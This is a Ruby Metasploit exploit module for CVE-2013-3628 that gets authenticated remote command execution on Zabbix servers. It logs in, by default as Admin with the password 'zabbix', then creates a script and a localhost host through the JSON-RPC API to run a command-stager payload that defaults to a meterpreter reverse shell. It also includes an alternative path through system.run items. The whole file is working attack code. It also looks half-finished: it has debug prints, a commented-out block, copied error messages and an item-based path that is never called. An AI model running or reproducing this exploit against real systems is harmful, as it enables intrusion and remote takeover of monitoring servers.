##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'

$globalvar = ''

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Zabbix Authenticated Remote Command Execution',
      'Description'    => %q{
      ZABBIX allows an administrator to create scripts that will be run on hosts.
      An authenticated attacker can create a script containing a payload, then a host
      with an IP of 127.0.0.1 and run the arbitrary script on the ZABBIX host.

      This module was tested against Zabbix v2.0.9.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>' # Discovery / msf module
        ],
      'References'     =>
        [
          ['CVE', '2013-3628'],
          ['URL', 'https://blog.rapid7.com/2013/10/30/seven-tricks-and-treats']
        ],
      
      'Platform'       => ['unix', 'linux'],
      'Arch'           => [ARCH_CMD, ARCH_X86, ARCH_X64],
      'Targets'        => [
        [ 'Automatic', {
          'Platform' => 'linux',
          'Arch' => [ARCH_X86, ARCH_X64],
          'Type' => :linux_dropper,
          'CmdStagerFlavor' => [ 'wget', 'lwprequest', 'curl', 'printf' ],
          'DefaultOptions' => {
            'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'
          }
        } 
      ]
      ],
      'DisclosureDate' => '2013-10-30',
      'DefaultTarget'  => 0
    ))

    register_options(
    [
      OptString.new('USERNAME', [ true, "Username to authenticate with", 'Admin']),
      OptString.new('PASSWORD', [ true, "Password to authenticate with", 'zabbix']),
      OptString.new('TARGETURI', [ true, "The URI of the Zabbix installation", '/zabbix/']),
      OptString.new('TLS_PSK_IDENTITY', [ false, "The TLS identity", '']),
      OptString.new('TLS_PSK', [ false, "The TLS PSK", '']),
      OptString.new('USE_ITEM', [ false, "Choose if the module must use script or item way of achieving RCE, item is only available on Zabbix server >= 4.0", false])
    ])
  end

  def execute_command(cmd, opts = {})
    $globalvar = cmd
  end

  def check
    init = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "/index.php")
    })

    if !init or init.code != 200
      vprint_error("Could not connect to server")
      return Exploit::CheckCode::Unknown
    end

    if init.body =~ /Zabbix (2\.0\.(\d)) Copyright/
      if $1 >= "2.0.0" and $1 <= "2.0.8"
      vprint_good("Version #{$1} is vulnerable.")
      return Exploit::CheckCode::Appears
      end
    end
    return Exploit::CheckCode::Safe
  end

  def create_script(auth_token, zabbix_version)
    execute_cmdstager

    script_title = rand_text_alpha(18)

    post = {
      "auth" => auth_token,
      "id" => 1,
      "jsonrpc" => "2.0",
      "method" => "script.create",
      "params" => {
          "command" => $globalvar,
          "host_access" => 2,
          "name" => script_title
      }
    }

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
      'data' => post.to_json,
      'ctype' => 'application/json-rpc'
    })

    begin
      script_id = JSON.parse(resp.body)['result']['scriptids'][0]
    rescue NoMethodError => e
      fail_with(Failure::NoAccess, "Error creating script")
      elog(e)
      return
    end

    return script_id
  end

  def execute_script(auth_token, host_id, script_id, zabbix_version)
    puts script_id
    puts host_id
    post = {
      "jsonrpc" => "2.0",
      "method" => "script.execute",
      "params" => {
        "scriptid" => script_id.to_s,
        "hostid" => host_id.to_s
      },
      "auth" => auth_token,
      "id" => 1
    }

    resp = send_request_raw({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
      'data' => post.to_json,
      'ctype' => 'application/json-rpc',
      'headers' => {
        'User-Agent' => 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language' => 'en-US,en;q=0.5',
        'Accept-Encoding' => 'gzip, deflate',
        'Connection' => 'close'
      }
    })

    sleep(20)

    begin
      data = JSON.parse(resp.body)['error']['data']

      while data == "Unknown host identifier." || data == "Unknown Host ID [#{host_id}]."
        resp = send_request_raw({
          'method' => 'POST',
          'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
          'data' => post.to_json,
          'ctype' => 'application/json-rpc',
          'headers' => {
            'User-Agent' => 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language' => 'en-US,en;q=0.5',
            'Accept-Encoding' => 'gzip, deflate',
            'Connection' => 'close'
          }
        })
        sleep(5)
        puts resp.body
      end
      result = JSON.parse(resp.body)['result']['response']
      return
    rescue NoMethodError => e
      fail_with(Failure::NoAccess, "Error executing the script2")
      elog(e)
      return
    end
  end

  def exploit_script(auth_token, zabbix_version)
    execute_cmdstager

    script_id = create_script(auth_token, zabbix_version)
    group_id = find_group_id(auth_token)
    host_id = create_host(auth_token, group_id, zabbix_version)

    execute_script(auth_token, host_id, script_id,zabbix_version)
=begin
    if zabbix_version == 3
      uri = normalize_uri(target_uri.path, "/scripts_exec.php?hostid=#{host_id}&scriptid=#{(script_id)}&sid=#{auth_token}")
    elsif zabbix_version == 2
      uri = normalize_uri(target_uri.path, "/scripts_exec.php?execute=1&hostid=#{host_id}&scriptid=#{script_id}&sid=#{auth_token}")
    end
    
    

    resp = send_request_cgi({
      'method' => 'GET',
      'uri' => uri,
      'keep_cookies' => true
    })
    puts "lol2"
=end
  end

  def find_group_id(auth_token)
    print_status('Getting a valid group id...')

    post = {
      "auth" => auth_token,
      "id" => 1,
      "jsonrpc" => "2.0",
      "method" => "hostgroup.get",
      "params" => {
          "output" => "extend"
      }
    }

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
      'data' => post.to_json,
      'ctype' => 'application/json-rpc'
    })

    puts resp.body

    begin
      group_id = JSON.parse(resp.body)['result'][0]['groupid']
    rescue NoMethodError => e
      fail_with(Failure::NoAccess, "Error creating script")
      elog(e)
      return
    end

    return group_id
  end

  def create_host(auth_token, groupid, zabbix_version)
    host = rand_text_alpha(18)

    print_status("Creating a host named: #{host}")

    post = {
      "auth" => auth_token,
      "id" => 1,
      "jsonrpc" => "2.0",
      "method" => "host.create",
      "params" => {
          "groups" => [
              {
                  "groupid" => groupid
              }
          ],
          "host" => host,
          "interfaces" => [
              {
                  "dns" => "",
                  "ip" => "127.0.0.1",
                  "main" => 1,
                  "port" => "10050",
                  "type" => 1,
                  "useip" => 1
              }
          ],
          "inventory" => {
              "macaddress_a" => "01234",
              "macaddress_b" => "56768"
          },
          "inventory_mode" => 0,
          "macros" => [
              {
                  "macro" => "{$USER_ID}",
                  "value" => "123321"
              }
          ]
      }
    }

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
      'data' => post.to_json,
      'ctype' => 'application/json-rpc',
    })
  
    begin
      hostid = JSON.parse(resp.body)['result']['hostids'][0]
    rescue JSON::ParserError => e
      fail_with(Failure::UnexpectedReply, "Error creating new host")
      elog(e)
      return
    end

    return hostid
  end

  def login()
    post = {
      "auth" => nil,
      "id" => 1,
      "jsonrpc" => "2.0",
      "method" => "user.login",
      "params" => {
          "password" => datastore['PASSWORD'],
          "user" => datastore['USERNAME']
      }
    }

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
      'data' => post.to_json,
      'ctype' => 'application/json-rpc'
    })

    begin
      auth_token = JSON.parse(resp.body)['result']
    rescue JSON::ParserError => e
      fail_with(Failure::NoAccess, "Login failed")
      elog(e)
      return
    end

    return auth_token
  end

  # Only work in Zabbix server version greater or equal to 4.0
  def exploit_item(sid, zabbix_version)
    execute_cmdstager

    groupid = find_group_id(sid)
    hostid = create_host(sid, groupid, zabbix_version)

    print_status("Using an item to execute a payload...")

    post = {
      'key' => "system.run[#{$globalvar} ,nowait]",
      'delay' => '',
      'value_type' => 4,
      'item_type' => 0,
      'itemid' => 0,
      'interfaceid' => 0,
      'get_value' => 1,
      'interface[address]' => '127.0.0.1',
      'interface[port]' => 10050,
      'proxy_hostid' => 0,
      'show_final_result' => 1,
      'test_type' => 0,
      'hostid' => hostid,
      'valuemapid' => 0
    }

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, "/zabbix.php?sid=#{sid}&action=popup.itemtest.send"),
      'vars_post' => post,
      'keep_cookies' => true
    })
  end

  def get_version()
    post = {
      "auth" => nil,
      "id" => 1,
      "jsonrpc" => "2.0",
      "method" => "apiinfo.version",
      "params" => {}
    }

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),
      'data' => post.to_json,
      'ctype' => 'application/json-rpc'
    })

    begin
      version = JSON.parse(resp.body)['result']
    rescue JSON::ParserError => e
      fail_with(Failure::NoAccess, "Login failed")
      elog(e)
      return
    end

    return version
  end

  def exploit
    version = get_version()
    auth_token = login()
    exploit_script(auth_token, version.to_i)
  end
end
